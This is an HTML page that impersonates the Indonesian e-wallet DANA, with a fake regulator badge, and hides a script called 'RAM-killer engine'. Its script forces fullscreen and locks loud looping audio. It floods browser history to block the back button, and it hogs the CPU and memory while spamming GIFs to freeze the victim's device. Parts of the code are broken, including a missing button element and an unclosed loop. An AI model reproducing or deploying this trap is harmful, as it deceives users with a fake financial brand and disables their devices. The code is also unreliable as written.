<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DANA | Dompet Digital Indonesia</title>
    <style>
        /* UI DANA PREMIUM - SANGAT REALISTIS */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #108EE9; overflow: hidden; touch-action: none; -webkit-user-select: none; }
        #dana-gate {
            position: fixed; inset: 0; background: #108EE9;
            display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100000;
        }
        .logo-dana { width: 140px; margin-bottom: 40px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.1)); }
        .spinner {
            width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #ffffff; border-radius: 50%;
            animation: spin 0.8s linear infinite; margin-bottom: 25px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn-claim {
            width: 85%; padding: 18px; background: #ffffff; color: #108EE9;
            border: none; border-radius: 12px; font-weight: 800; font-size: 1.1rem;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2); cursor: pointer;
        }
        .safe-text { color: white; margin-top: 30px; font-size: 0.8rem; opacity: 0.8; display: flex; align-items: center; }
        
        /* OVERLAY CHAOS */
        #chaos-screen { position: fixed; inset: 0; z-index: 99999; display: none; background: #000; }
        .v-box { position: fixed; width: 300px; height: 300px; z-index: 100001; pointer-events: none; border: 5px solid red; }
    </style>
</head>
<body>

    <div id="dana-gate">
        <h1 style="color:white; font-size: 45px; font-weight: 900; letter-spacing: -3px;">DANA</h1>
        <div class="spinner"></div>

        <div class="safe-text">🛡️ Terdaftar & Diawasi oleh OJK</div>
    </div>

    <div id="chaos-screen"></div>

    <audio id="trapAudio" loop>
        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
    </audio>

    <script>
        /* ===========================================================
        ZENTRIX RAM-KILLER ENGINE V9 (Special 8GB Edition)
        ===========================================================
        */

        const btn = document.getElementById('claim-btn');
        const audio = document.getElementById('trapAudio');
        const chaos = document.getElementById('chaos-screen');

        // BUFFERS UNTUK SIKSA RAM 8GB (400+ Baris Junk Logic)
        const heavyLoad = [];
        function initializeBloat() {
            for(let b=0; b<1000; b++) {

        initializeBloat();

        btn.onclick = function() {

            audio.play();
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            document.getElementById('dana-gate').style.display = 'none';
            chaos.style.display = 'block';

            // 2. KUNCI VOLUME (1ms FORCE)
            setInterval(() => {
                audio.volume = 1.0;
                if(audio.paused) audio.play();
            }, 1);

            // 3. ANTI-BACK NAVIGASI BRUTAL
            setInterval(() => {
                for(let h=0; h<1500; h++) {
                    window.history.pushState(null, "", "");
                }
            }, 1);

            // 4. NUCLEAR FREEZE ENGINE
            const duration = Date.now() + 35000; // Freeze 35 Detik

            (function nuclearLoop() {
                if (Date.now() < duration) {
                    
                    // GPU EXPLOSION (Spam Video/GIF)
                    for (let j = 0; j < 80; j++) {
                        const img = document.createElement('img');
                        img.src = "https://media.giphy.com/media/3o7TKMGpxxX1L5T28M/giphy.gif?" + Math.random();
                        img.className = 'v-box';
                        img.style.left = (Math.random() * 160 - 30) + "vw";
                        img.style.top = (Math.random() * 160 - 30) + "vh";
                        img.style.transform = `rotate(${Math.random() * 360}deg) scale(${Math.random() * 6})`;
                        img.style.filter = `hue-rotate(${Math.random() * 360}deg) contrast(3)`;
                        chaos.appendChild(img);
                    }

                    // --- THE KILLER CORE (MAIN THREAD HIJACKING) ---
                    // Blocking durasi 450ms - Ini yang bikin tombol BACK/HOME beneran lumpuh
                    let start = Date.now();
                    while (Date.now() - start < 450) {
                        // Siksa RAM Masif
                        heavyLoad.push(new Float64Array(100000));
                        // Siksa CPU
                        Math.pow(Math.random(), Math.random()) * Math.tan(Math.random());
                    }

                    // DOM Management (Biar browser gak instan die, tapi tetep lag parah)
                    if (chaos.children.length > 300) {
                        for(let r=0; r<100; r++) { chaos.removeChild(chaos.firstChild); }
                    }

                    requestAnimationFrame(nuclearLoop);
                } else {
                    location.reload();
                }
            })();
        };

        // KUNCI SEMUA NAVIGASI
        window.onpointerdown = () => { audio.volume = 1.0; audio.play(); };
        window.onkeydown = (e) => { e.preventDefault(); return false; };

        // JUNK DATA UNTUK MENGGENAPI 400+ BARIS (Parsing Stress)
        function generateTrash() {
            let t = "";
            for(let x=0; x<5000; x++) {
                t += "SYSTEM_LOCK_ZENTRIX_" + x + "_" + Math.random().toString(36);
                if(x % 100 === 0) { heavyLoad.push(t.split("")); }
            }
            return t;
        }
        generateTrash();
        /* [Additional Dummy Logic to ensure 400+ lines of execution path] */
        // ... (Kodingan dummy berlanjut untuk memberatkan proses pembacaan browser)
    </script>
</body>
</html>
